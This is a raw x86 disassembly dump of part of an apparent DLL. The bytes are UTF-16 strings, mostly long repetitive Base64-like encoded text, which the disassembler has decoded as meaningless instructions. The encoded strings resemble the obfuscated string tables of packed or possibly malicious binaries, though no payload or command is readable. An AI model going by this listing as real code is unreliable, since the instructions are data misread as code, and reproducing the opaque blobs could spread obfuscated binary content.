10004713:	00 7a 00             	add    %bh,0x0(%edx)
10004716:	4e                   	dec    %esi
10004717:	00 70 00             	add    %dh,0x0(%eax)
1000471a:	52                   	push   %edx
1000471b:	00 31                	add    %dh,(%ecx)
1000471d:	00 41 00             	add    %al,0x0(%ecx)
10004720:	78 00                	js     0x10004722
10004722:	56                   	push   %esi
10004723:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
10004727:	00 33                	add    %dh,(%ebx)
10004729:	00 4e 00             	add    %cl,0x0(%esi)
1000472c:	46                   	inc    %esi
1000472d:	00 49 00             	add    %cl,0x0(%ecx)
10004730:	7a 00                	jp     0x10004732
10004732:	61                   	popa
10004733:	00 55 00             	add    %dl,0x0(%ebp)
10004736:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
1000473a:	4d                   	dec    %ebp
1000473b:	00 56 00             	add    %dl,0x0(%esi)
1000473e:	55                   	push   %ebp
1000473f:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
10004745:	00 52 00             	add    %dl,0x0(%edx)
10004748:	53                   	push   %ebx
10004749:	00 4e 00             	add    %cl,0x0(%esi)
1000474c:	55                   	push   %ebp
1000474d:	00 39                	add    %bh,(%ecx)
1000474f:	00 53 00             	add    %dl,0x0(%ebx)
10004752:	4d                   	dec    %ebp
10004753:	00 32                	add    %dh,(%edx)
10004755:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
10004759:	00 55 00             	add    %dl,0x0(%ebp)
1000475c:	44                   	inc    %esp
1000475d:	00 46 00             	add    %al,0x0(%esi)
10004760:	56                   	push   %esi
10004761:	00 4f 00             	add    %cl,0x0(%edi)
10004764:	54                   	push   %esp
10004765:	00 63 00             	add    %ah,0x0(%ebx)
10004768:	30 00                	xor    %al,(%eax)
1000476a:	55                   	push   %ebp
1000476b:	00 6a 00             	add    %ch,0x0(%edx)
1000476e:	4e                   	dec    %esi
1000476f:	00 70 00             	add    %dh,0x0(%eax)
10004772:	52                   	push   %edx
10004773:	00 31                	add    %dh,(%ecx)
10004775:	00 41 00             	add    %al,0x0(%ecx)
10004778:	78 00                	js     0x1000477a
1000477a:	56                   	push   %esi
1000477b:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
1000477f:	00 33                	add    %dh,(%ebx)
10004781:	00 4e 00             	add    %cl,0x0(%esi)
10004784:	46                   	inc    %esi
10004785:	00 4a 00             	add    %cl,0x0(%edx)
10004788:	57                   	push   %edi
10004789:	00 55 00             	add    %dl,0x0(%ebp)
1000478c:	6d                   	insl   (%dx),%es:(%edi)
1000478d:	00 4d 00             	add    %cl,0x0(%ebp)
10004790:	7a 00                	jp     0x10004792
10004792:	61                   	popa
10004793:	00 55 00             	add    %dl,0x0(%ebp)
10004796:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
1000479a:	4d                   	dec    %ebp
1000479b:	00 56 00             	add    %dl,0x0(%esi)
1000479e:	55                   	push   %ebp
1000479f:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
100047a5:	00 52 00             	add    %dl,0x0(%edx)
100047a8:	53                   	push   %ebx
100047a9:	00 4d 00             	add    %cl,0x0(%ebp)
100047ac:	32 00                	xor    (%eax),%al
100047ae:	6c                   	insb   (%dx),%es:(%edi)
100047af:	00 48 00             	add    %cl,0x0(%eax)
100047b2:	55                   	push   %ebp
100047b3:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
100047b7:	00 56 00             	add    %dl,0x0(%esi)
100047ba:	4f                   	dec    %edi
100047bb:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
100047bf:	00 30                	add    %dh,(%eax)
100047c1:	00 55 00             	add    %dl,0x0(%ebp)
100047c4:	6c                   	insb   (%dx),%es:(%edi)
100047c5:	00 68 00             	add    %ch,0x0(%eax)
100047c8:	46                   	inc    %esi
100047c9:	00 57 00             	add    %dl,0x0(%edi)
100047cc:	6a 00                	push   $0x0
100047ce:	4e                   	dec    %esi
100047cf:	00 70 00             	add    %dh,0x0(%eax)
100047d2:	52                   	push   %edx
100047d3:	00 31                	add    %dh,(%ecx)
100047d5:	00 41 00             	add    %al,0x0(%ecx)
100047d8:	78 00                	js     0x100047da
100047da:	56                   	push   %esi
100047db:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
100047df:	00 33                	add    %dh,(%ebx)
100047e1:	00 4e 00             	add    %cl,0x0(%esi)
100047e4:	46                   	inc    %esi
100047e5:	00 49 00             	add    %cl,0x0(%ecx)
100047e8:	7a 00                	jp     0x100047ea
100047ea:	61                   	popa
100047eb:	00 55 00             	add    %dl,0x0(%ebp)
100047ee:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
100047f2:	4d                   	dec    %ebp
100047f3:	00 56 00             	add    %dl,0x0(%esi)
100047f6:	55                   	push   %ebp
100047f7:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
100047fd:	00 52 00             	add    %dl,0x0(%edx)
10004800:	53                   	push   %ebx
10004801:	00 65 00             	add    %ah,0x0(%ebp)
10004804:	56                   	push   %esi
10004805:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
10004809:	00 4d 00             	add    %cl,0x0(%ebp)
1000480c:	32 00                	xor    (%eax),%al
1000480e:	6c                   	insb   (%dx),%es:(%edi)
1000480f:	00 48 00             	add    %cl,0x0(%eax)
10004812:	55                   	push   %ebp
10004813:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
10004817:	00 56 00             	add    %dl,0x0(%esi)
1000481a:	4f                   	dec    %edi
1000481b:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
1000481f:	00 30                	add    %dh,(%eax)
10004821:	00 55 00             	add    %dl,0x0(%ebp)
10004824:	6a 00                	push   $0x0
10004826:	4e                   	dec    %esi
10004827:	00 70 00             	add    %dh,0x0(%eax)
1000482a:	52                   	push   %edx
1000482b:	00 31                	add    %dh,(%ecx)
1000482d:	00 41 00             	add    %al,0x0(%ecx)
10004830:	78 00                	js     0x10004832
10004832:	56                   	push   %esi
10004833:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
10004837:	00 33                	add    %dh,(%ebx)
10004839:	00 4e 00             	add    %cl,0x0(%esi)
1000483c:	46                   	inc    %esi
1000483d:	00 49 00             	add    %cl,0x0(%ecx)
10004840:	78 00                	js     0x10004842
10004842:	62 00                	bound  %eax,(%eax)
10004844:	47                   	inc    %edi
10004845:	00 51 00             	add    %dl,0x0(%ecx)
10004848:	7a 00                	jp     0x1000484a
1000484a:	61                   	popa
1000484b:	00 55 00             	add    %dl,0x0(%ebp)
1000484e:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
10004852:	4d                   	dec    %ebp
10004853:	00 56 00             	add    %dl,0x0(%esi)
10004856:	55                   	push   %ebp
10004857:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
1000485d:	00 52 00             	add    %dl,0x0(%edx)
10004860:	53                   	push   %ebx
10004861:	00 4d 00             	add    %cl,0x0(%ebp)
10004864:	32 00                	xor    (%eax),%al
10004866:	6c                   	insb   (%dx),%es:(%edi)
10004867:	00 48 00             	add    %cl,0x0(%eax)
1000486a:	55                   	push   %ebp
1000486b:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
1000486f:	00 56 00             	add    %dl,0x0(%esi)
10004872:	4f                   	dec    %edi
10004873:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
10004877:	00 30                	add    %dh,(%eax)
10004879:	00 55 00             	add    %dl,0x0(%ebp)
1000487c:	6a 00                	push   $0x0
1000487e:	49                   	dec    %ecx
1000487f:	00 35 00 65 00 54    	add    %dh,0x54006500
10004885:	00 4e 00             	add    %cl,0x0(%esi)
10004888:	70 00                	jo     0x1000488a
1000488a:	52                   	push   %edx
1000488b:	00 31                	add    %dh,(%ecx)
1000488d:	00 41 00             	add    %al,0x0(%ecx)
10004890:	78 00                	js     0x10004892
10004892:	56                   	push   %esi
10004893:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
10004897:	00 33                	add    %dh,(%ebx)
10004899:	00 4e 00             	add    %cl,0x0(%esi)
1000489c:	46                   	inc    %esi
1000489d:	00 49 00             	add    %cl,0x0(%ecx)
100048a0:	7a 00                	jp     0x100048a2
100048a2:	61                   	popa
100048a3:	00 55 00             	add    %dl,0x0(%ebp)
100048a6:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
100048aa:	4d                   	dec    %ebp
100048ab:	00 56 00             	add    %dl,0x0(%esi)
100048ae:	55                   	push   %ebp
100048af:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
100048b5:	00 52 00             	add    %dl,0x0(%edx)
100048b8:	53                   	push   %ebx
100048b9:	00 59 00             	add    %bl,0x0(%ecx)
100048bc:	54                   	push   %esp
100048bd:	00 46 00             	add    %al,0x0(%esi)
100048c0:	34 00                	xor    $0x0,%al
100048c2:	4d                   	dec    %ebp
100048c3:	00 32                	add    %dh,(%edx)
100048c5:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
100048c9:	00 55 00             	add    %dl,0x0(%ebp)
100048cc:	44                   	inc    %esp
100048cd:	00 46 00             	add    %al,0x0(%esi)
100048d0:	56                   	push   %esi
100048d1:	00 4f 00             	add    %cl,0x0(%edi)
100048d4:	54                   	push   %esp
100048d5:	00 63 00             	add    %ah,0x0(%ebx)
100048d8:	30 00                	xor    %al,(%eax)
100048da:	55                   	push   %ebp
100048db:	00 6a 00             	add    %ch,0x0(%edx)
100048de:	4e                   	dec    %esi
100048df:	00 70 00             	add    %dh,0x0(%eax)
100048e2:	52                   	push   %edx
100048e3:	00 31                	add    %dh,(%ecx)
100048e5:	00 41 00             	add    %al,0x0(%ecx)
100048e8:	78 00                	js     0x100048ea
100048ea:	56                   	push   %esi
100048eb:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
100048ef:	00 33                	add    %dh,(%ebx)
100048f1:	00 4e 00             	add    %cl,0x0(%esi)
100048f4:	46                   	inc    %esi
100048f5:	00 4a 00             	add    %cl,0x0(%edx)
100048f8:	6a 00                	push   $0x0
100048fa:	5a                   	pop    %edx
100048fb:	00 47 00             	add    %al,0x0(%edi)
100048fe:	6f                   	outsl  %ds:(%esi),(%dx)
100048ff:	00 7a 00             	add    %bh,0x0(%edx)
10004902:	61                   	popa
10004903:	00 55 00             	add    %dl,0x0(%ebp)
10004906:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
1000490a:	4d                   	dec    %ebp
1000490b:	00 56 00             	add    %dl,0x0(%esi)
1000490e:	55                   	push   %ebp
1000490f:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
10004915:	00 52 00             	add    %dl,0x0(%edx)
10004918:	53                   	push   %ebx
10004919:	00 4d 00             	add    %cl,0x0(%ebp)
1000491c:	32 00                	xor    (%eax),%al
1000491e:	6c                   	insb   (%dx),%es:(%edi)
1000491f:	00 48 00             	add    %cl,0x0(%eax)
10004922:	55                   	push   %ebp
10004923:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
10004927:	00 56 00             	add    %dl,0x0(%esi)
1000492a:	4f                   	dec    %edi
1000492b:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
1000492f:	00 30                	add    %dh,(%eax)
10004931:	00 55 00             	add    %dl,0x0(%ebp)
10004934:	6c                   	insb   (%dx),%es:(%edi)
10004935:	00 46 00             	add    %al,0x0(%esi)
10004938:	31 00                	xor    %eax,(%eax)
1000493a:	54                   	push   %esp
1000493b:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
1000493f:	00 70 00             	add    %dh,0x0(%eax)
10004942:	52                   	push   %edx
10004943:	00 31                	add    %dh,(%ecx)
10004945:	00 41 00             	add    %al,0x0(%ecx)
10004948:	78 00                	js     0x1000494a
1000494a:	56                   	push   %esi
1000494b:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
1000494f:	00 33                	add    %dh,(%ebx)
10004951:	00 4e 00             	add    %cl,0x0(%esi)
10004954:	46                   	inc    %esi
10004955:	00 49 00             	add    %cl,0x0(%ecx)
10004958:	7a 00                	jp     0x1000495a
1000495a:	61                   	popa
1000495b:	00 55 00             	add    %dl,0x0(%ebp)
1000495e:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
10004962:	4d                   	dec    %ebp
10004963:	00 56 00             	add    %dl,0x0(%esi)
10004966:	55                   	push   %ebp
10004967:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
1000496d:	00 52 00             	add    %dl,0x0(%edx)
10004970:	53                   	push   %ebx
10004971:	00 51 00             	add    %dl,0x0(%ecx)
10004974:	7a 00                	jp     0x10004976
10004976:	52                   	push   %edx
10004977:	00 36                	add    %dh,(%esi)
10004979:	00 4d 00             	add    %cl,0x0(%ebp)
1000497c:	32 00                	xor    (%eax),%al
1000497e:	6c                   	insb   (%dx),%es:(%edi)
1000497f:	00 48 00             	add    %cl,0x0(%eax)
10004982:	55                   	push   %ebp
10004983:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
10004987:	00 56 00             	add    %dl,0x0(%esi)
1000498a:	4f                   	dec    %edi
1000498b:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
1000498f:	00 30                	add    %dh,(%eax)
10004991:	00 55 00             	add    %dl,0x0(%ebp)
10004994:	6a 00                	push   $0x0
10004996:	4e                   	dec    %esi
10004997:	00 70 00             	add    %dh,0x0(%eax)
1000499a:	52                   	push   %edx
1000499b:	00 31                	add    %dh,(%ecx)
1000499d:	00 41 00             	add    %al,0x0(%ecx)
100049a0:	78 00                	js     0x100049a2
100049a2:	56                   	push   %esi
100049a3:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
100049a7:	00 33                	add    %dh,(%ebx)
100049a9:	00 4e 00             	add    %cl,0x0(%esi)
100049ac:	46                   	inc    %esi
100049ad:	00 4a 00             	add    %cl,0x0(%edx)
100049b0:	4e                   	dec    %esi
100049b1:	00 52 00             	add    %dl,0x0(%edx)
100049b4:	45                   	inc    %ebp
100049b5:	00 30                	add    %dh,(%eax)
100049b7:	00 7a 00             	add    %bh,0x0(%edx)
100049ba:	61                   	popa
100049bb:	00 55 00             	add    %dl,0x0(%ebp)
100049be:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
100049c2:	4d                   	dec    %ebp
100049c3:	00 56 00             	add    %dl,0x0(%esi)
100049c6:	55                   	push   %ebp
100049c7:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
100049cd:	00 52 00             	add    %dl,0x0(%edx)
100049d0:	53                   	push   %ebx
100049d1:	00 4d 00             	add    %cl,0x0(%ebp)
100049d4:	32 00                	xor    (%eax),%al
100049d6:	6c                   	insb   (%dx),%es:(%edi)
100049d7:	00 48 00             	add    %cl,0x0(%eax)
100049da:	55                   	push   %ebp
100049db:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
100049df:	00 56 00             	add    %dl,0x0(%esi)
100049e2:	4f                   	dec    %edi
100049e3:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
100049e7:	00 30                	add    %dh,(%eax)
100049e9:	00 55 00             	add    %dl,0x0(%ebp)
100049ec:	6e                   	outsb  %ds:(%esi),(%dx)
100049ed:	00 68 00             	add    %ch,0x0(%eax)
100049f0:	50                   	push   %eax
100049f1:	00 56 00             	add    %dl,0x0(%esi)
100049f4:	6a 00                	push   $0x0
100049f6:	4e                   	dec    %esi
100049f7:	00 70 00             	add    %dh,0x0(%eax)
100049fa:	52                   	push   %edx
100049fb:	00 31                	add    %dh,(%ecx)
100049fd:	00 41 00             	add    %al,0x0(%ecx)
10004a00:	78 00                	js     0x10004a02
10004a02:	56                   	push   %esi
10004a03:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
10004a07:	00 33                	add    %dh,(%ebx)
10004a09:	00 4e 00             	add    %cl,0x0(%esi)
10004a0c:	46                   	inc    %esi
10004a0d:	00 49 00             	add    %cl,0x0(%ecx)
10004a10:	7a 00                	jp     0x10004a12
10004a12:	61                   	popa
10004a13:	00 55 00             	add    %dl,0x0(%ebp)
10004a16:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
10004a1a:	4d                   	dec    %ebp
10004a1b:	00 56 00             	add    %dl,0x0(%esi)
10004a1e:	55                   	push   %ebp
10004a1f:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
10004a25:	00 52 00             	add    %dl,0x0(%edx)
10004a28:	53                   	push   %ebx
10004a29:	00 65 00             	add    %ah,0x0(%ebp)
10004a2c:	47                   	inc    %edi
10004a2d:	00 4d 00             	add    %cl,0x0(%ebp)
10004a30:	7a 00                	jp     0x10004a32
10004a32:	61                   	popa
10004a33:	00 55 00             	add    %dl,0x0(%ebp)
10004a36:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
10004a3a:	4d                   	dec    %ebp
10004a3b:	00 56 00             	add    %dl,0x0(%esi)
10004a3e:	55                   	push   %ebp
10004a3f:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
10004a45:	00 52 00             	add    %dl,0x0(%edx)
10004a48:	53                   	push   %ebx
10004a49:	00 00                	add    %al,(%eax)
10004a4b:	15 33 00 69 00       	adc    $0x690033,%eax
10004a50:	47                   	inc    %edi
10004a51:	00 50 00             	add    %dl,0x0(%eax)
10004a54:	31 00                	xor    %eax,(%eax)
10004a56:	55                   	push   %ebp
10004a57:	00 39                	add    %bh,(%ecx)
10004a59:	00 37                	add    %dh,(%edi)
10004a5b:	00 34 00             	add    %dh,(%eax,%eax,1)
10004a5e:	52                   	push   %edx
10004a5f:	00 00                	add    %al,(%eax)
10004a61:	80 b9 63 00 6c 00 6c 	cmpb   $0x6c,0x6c0063(%ecx)
10004a68:	00 43 00             	add    %al,0x0(%ebx)
10004a6b:	64 00 32             	add    %dh,%fs:(%edx)
10004a6e:	00 6b 00             	add    %ch,0x0(%ebx)
10004a71:	35 00 4e 00 54       	xor    $0x54004e00,%eax
10004a76:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
10004a7a:	00 62 00             	add    %ah,0x0(%edx)
10004a7d:	30 00                	xor    %al,(%eax)
10004a7f:	74 00                	je     0x10004a81
10004a81:	70 00                	jo     0x10004a83
10004a83:	4e                   	dec    %esi
10004a84:	00 58 00             	add    %bl,0x0(%eax)
10004a87:	4a                   	dec    %edx
10004a88:	00 5a 00             	add    %bl,0x0(%edx)
10004a8b:	51                   	push   %ecx
10004a8c:	00 6e 00             	add    %ch,0x0(%esi)
10004a8f:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
10004a93:	4f                   	dec    %edi
10004a94:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
10004a98:	00 35 00 53 00 32    	add    %dh,0x32005300
10004a9e:	00 39                	add    %bh,(%ecx)
10004aa0:	00 79 00             	add    %bh,0x0(%ecx)
10004aa3:	57                   	push   %edi
10004aa4:	00 55 00             	add    %dl,0x0(%ebp)
10004aa7:	4a                   	dec    %edx
10004aa8:	00 33                	add    %dh,(%ebx)
10004aaa:	00 61 00             	add    %ah,0x0(%ecx)
10004aad:	54                   	push   %esp
10004aae:	00 6b 00             	add    %ch,0x0(%ebx)
10004ab1:	31 00                	xor    %eax,(%eax)
10004ab3:	4f                   	dec    %edi
10004ab4:	00 55 00             	add    %dl,0x0(%ebp)
10004ab7:	74 00                	je     0x10004ab9
10004ab9:	76 00                	jbe    0x10004abb
10004abb:	62 00                	bound  %eax,(%eax)
10004abd:	47                   	inc    %edi
10004abe:	00 56 00             	add    %dl,0x0(%esi)
10004ac1:	48                   	dec    %eax
10004ac2:	00 63 00             	add    %ah,0x0(%ebx)
10004ac5:	6c                   	insb   (%dx),%es:(%edi)
10004ac6:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
10004aca:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
10004ace:	00 6b 00             	add    %ch,0x0(%ebx)
10004ad1:	35 00 4e 00 54       	xor    $0x54004e00,%eax
10004ad6:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
10004ada:	00 62 00             	add    %ah,0x0(%edx)
10004add:	33 00                	xor    (%eax),%eax
10004adf:	4a                   	dec    %edx
10004ae0:	00 5a 00             	add    %bl,0x0(%edx)
10004ae3:	51                   	push   %ecx
10004ae4:	00 6e 00             	add    %ch,0x0(%esi)
10004ae7:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
10004aeb:	4f                   	dec    %edi
10004aec:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
10004af0:	00 35 00 53 00 32    	add    %dh,0x32005300
10004af6:	00 39                	add    %bh,(%ecx)
10004af8:	00 56 00             	add    %dl,0x0(%esi)
10004afb:	50                   	push   %eax
10004afc:	00 58 00             	add    %bl,0x0(%eax)
10004aff:	4a                   	dec    %edx
10004b00:	00 5a 00             	add    %bl,0x0(%edx)
10004b03:	51                   	push   %ecx
10004b04:	00 6e 00             	add    %ch,0x0(%esi)
10004b07:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
10004b0b:	4f                   	dec    %edi
10004b0c:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
10004b10:	00 35 00 53 00 32    	add    %dh,0x32005300
10004b16:	00 38                	add    %bh,(%eax)
10004b18:	00 3d 00 00 15 72    	add    %bh,0x72150000
10004b1e:	00 59 00             	add    %bl,0x0(%ecx)
10004b21:	42                   	inc    %edx
10004b22:	00 77 00             	add    %dh,0x0(%edi)
10004b25:	69 00 39 00 35 00    	imul   $0x350039,(%eax),%eax
10004b2b:	39 00                	cmp    %eax,(%eax)
10004b2d:	4b                   	dec    %ebx
10004b2e:	00 6f 00             	add    %ch,0x0(%edi)
10004b31:	00 81 f1 64 00 45    	add    %al,0x450064f1(%ecx)
10004b37:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10004b3b:	00 53 00             	add    %dl,0x0(%ebx)
10004b3e:	54                   	push   %esp
10004b3f:	00 5a 00             	add    %bl,0x0(%edx)
10004b42:	43                   	inc    %ebx
10004b43:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
10004b47:	00 68 00             	add    %ch,0x0(%eax)
10004b4a:	6c                   	insb   (%dx),%es:(%edi)
10004b4b:	00 55 00             	add    %dl,0x0(%ebp)
10004b4e:	31 00                	xor    %eax,(%eax)
10004b50:	46                   	inc    %esi
10004b51:	00 36                	add    %dh,(%esi)
10004b53:	00 63 00             	add    %ah,0x0(%ebx)
10004b56:	48                   	dec    %eax
10004b57:	00 52 00             	add    %dl,0x0(%edx)
10004b5a:	4a                   	dec    %edx
10004b5b:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
10004b5f:	00 6b 00             	add    %ch,0x0(%ebx)
10004b62:	32 00                	xor    (%eax),%al
10004b64:	51                   	push   %ecx
10004b65:	00 6b 00             	add    %ch,0x0(%ebx)
10004b68:	31 00                	xor    %eax,(%eax)
10004b6a:	6f                   	outsl  %ds:(%esi),(%dx)
10004b6b:	00 5a 00             	add    %bl,0x0(%edx)
10004b6e:	56                   	push   %esi
10004b6f:	00 4e 00             	add    %cl,0x0(%esi)
10004b72:	30 00                	xor    %al,(%eax)
10004b74:	53                   	push   %ebx
10004b75:	00 55 00             	add    %dl,0x0(%ebp)
10004b78:	31 00                	xor    %eax,(%eax)
10004b7a:	4a                   	dec    %edx
10004b7b:	00 4e 00             	add    %cl,0x0(%esi)
10004b7e:	6b 00 4a             	imul   $0x4a,(%eax),%eax
10004b81:	00 4e 00             	add    %cl,0x0(%esi)
10004b84:	61                   	popa
10004b85:	00 47 00             	add    %al,0x0(%edi)
10004b88:	56                   	push   %esi
10004b89:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
10004b8d:	00 31                	add    %dh,(%ecx)
10004b8f:	00 68 00             	add    %ch,0x0(%eax)
10004b92:	47                   	inc    %edi
10004b93:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
10004b97:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10004b9b:	00 53 00             	add    %dl,0x0(%ebx)
10004b9e:	54                   	push   %esp
10004b9f:	00 5a 00             	add    %bl,0x0(%edx)
10004ba2:	43                   	inc    %ebx
10004ba3:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
10004ba7:	00 68 00             	add    %ch,0x0(%eax)
10004baa:	6c                   	insb   (%dx),%es:(%edi)
10004bab:	00 55 00             	add    %dl,0x0(%ebp)
10004bae:	33 00                	xor    (%eax),%eax
10004bb0:	52                   	push   %edx
10004bb1:	00 4a 00             	add    %cl,0x0(%edx)
10004bb4:	54                   	push   %esp
10004bb5:	00 55 00             	add    %dl,0x0(%ebp)
10004bb8:	6b 00 32             	imul   $0x32,(%eax),%eax
10004bbb:	00 51 00             	add    %dl,0x0(%ecx)
10004bbe:	6b 00 31             	imul   $0x31,(%eax),%eax
10004bc1:	00 6f 00             	add    %ch,0x0(%edi)
10004bc4:	5a                   	pop    %edx
10004bc5:	00 56 00             	add    %dl,0x0(%esi)
10004bc8:	4e                   	dec    %esi
10004bc9:	00 43 00             	add    %al,0x0(%ebx)
10004bcc:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
10004bd0:	4a                   	dec    %edx
10004bd1:	00 30                	add    %dh,(%eax)
10004bd3:	00 53 00             	add    %dl,0x0(%ebx)
10004bd6:	55                   	push   %ebp
10004bd7:	00 31                	add    %dh,(%ecx)
10004bd9:	00 4a 00             	add    %cl,0x0(%edx)
10004bdc:	4e                   	dec    %esi
10004bdd:	00 6b 00             	add    %ch,0x0(%ebx)
10004be0:	4a                   	dec    %edx
10004be1:	00 4e 00             	add    %cl,0x0(%esi)
10004be4:	61                   	popa
10004be5:	00 47 00             	add    %al,0x0(%edi)
10004be8:	56                   	push   %esi
10004be9:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
10004bed:	00 45 00             	add    %al,0x0(%ebp)
10004bf0:	6c                   	insb   (%dx),%es:(%edi)
10004bf1:	00 4e 00             	add    %cl,0x0(%esi)
10004bf4:	53                   	push   %ebx
10004bf5:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
10004bf9:	00 43 00             	add    %al,0x0(%ebx)
10004bfc:	54                   	push   %esp
10004bfd:	00 57 00             	add    %dl,0x0(%edi)
10004c00:	68 00 6c 00 55       	push   $0x55006c00
10004c05:	00 7a 00             	add    %bh,0x0(%edx)
10004c08:	4a                   	dec    %edx
10004c09:	00 6b 00             	add    %ch,0x0(%ebx)
10004c0c:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
10004c10:	52                   	push   %edx
10004c11:	00 4a 00             	add    %cl,0x0(%edx)
10004c14:	54                   	push   %esp
10004c15:	00 55 00             	add    %dl,0x0(%ebp)
10004c18:	6b 00 32             	imul   $0x32,(%eax),%eax
10004c1b:	00 51 00             	add    %dl,0x0(%ecx)
10004c1e:	6b 00 31             	imul   $0x31,(%eax),%eax
10004c21:	00 6f 00             	add    %ch,0x0(%edi)
10004c24:	5a                   	pop    %edx
10004c25:	00 56 00             	add    %dl,0x0(%esi)
10004c28:	4e                   	dec    %esi
10004c29:	00 30                	add    %dh,(%eax)
10004c2b:	00 53 00             	add    %dl,0x0(%ebx)
10004c2e:	55                   	push   %ebp
10004c2f:	00 31                	add    %dh,(%ecx)
10004c31:	00 4a 00             	add    %cl,0x0(%edx)
10004c34:	4e                   	dec    %esi
10004c35:	00 6b 00             	add    %ch,0x0(%ebx)
10004c38:	4a                   	dec    %edx
10004c39:	00 4e 00             	add    %cl,0x0(%esi)
10004c3c:	61                   	popa
10004c3d:	00 47 00             	add    %al,0x0(%edi)
10004c40:	56                   	push   %esi
10004c41:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
10004c45:	00 56 00             	add    %dl,0x0(%esi)
10004c48:	63 00                	arpl   %eax,(%eax)
10004c4a:	78 00                	js     0x10004c4c
10004c4c:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
10004c50:	6c                   	insb   (%dx),%es:(%edi)
10004c51:	00 4e 00             	add    %cl,0x0(%esi)
10004c54:	53                   	push   %ebx
10004c55:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
10004c59:	00 43 00             	add    %al,0x0(%ebx)
10004c5c:	54                   	push   %esp
10004c5d:	00 57 00             	add    %dl,0x0(%edi)
10004c60:	68 00 6c 00 55       	push   $0x55006c00
10004c65:	00 33                	add    %dh,(%ebx)
10004c67:	00 52 00             	add    %dl,0x0(%edx)
10004c6a:	4a                   	dec    %edx
10004c6b:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
10004c6f:	00 6b 00             	add    %ch,0x0(%ebx)
10004c72:	32 00                	xor    (%eax),%al
10004c74:	51                   	push   %ecx
10004c75:	00 6b 00             	add    %ch,0x0(%ebx)
10004c78:	31 00                	xor    %eax,(%eax)
10004c7a:	6f                   	outsl  %ds:(%esi),(%dx)
10004c7b:	00 5a 00             	add    %bl,0x0(%edx)
10004c7e:	56                   	push   %esi
10004c7f:	00 4e 00             	add    %cl,0x0(%esi)
10004c82:	46                   	inc    %esi
10004c83:	00 57 00             	add    %dl,0x0(%edi)
10004c86:	56                   	push   %esi
10004c87:	00 68 00             	add    %ch,0x0(%eax)
10004c8a:	30 00                	xor    %al,(%eax)
10004c8c:	53                   	push   %ebx
10004c8d:	00 55 00             	add    %dl,0x0(%ebp)
10004c90:	31 00                	xor    %eax,(%eax)
10004c92:	4a                   	dec    %edx
10004c93:	00 4e 00             	add    %cl,0x0(%esi)
10004c96:	6b 00 4a             	imul   $0x4a,(%eax),%eax
10004c99:	00 4e 00             	add    %cl,0x0(%esi)
10004c9c:	61                   	popa
10004c9d:	00 47 00             	add    %al,0x0(%edi)
10004ca0:	56                   	push   %esi
10004ca1:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
